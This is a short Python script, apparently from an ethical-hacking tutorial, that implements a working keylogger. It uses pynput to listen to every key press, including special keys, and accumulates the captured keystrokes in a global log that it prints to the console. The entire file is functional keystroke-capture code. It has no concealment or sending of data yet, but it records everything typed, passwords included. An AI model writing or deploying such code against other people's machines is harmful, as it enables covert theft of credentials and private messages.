#!/usr/bin/env python
import pynput.keyboard

log = "" #Creating an empty variable.
def process_key_press(key):
    global log
    try:
        log = log + str(key.char) #need to treat this object as a string.
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "
    print(log) #All information typed will be stored in this variable.

keyboard_listener = pynput.keyboard.Listener(on_press = process_key_press)
with keyboard_listener:
    keyboard_listener.join()
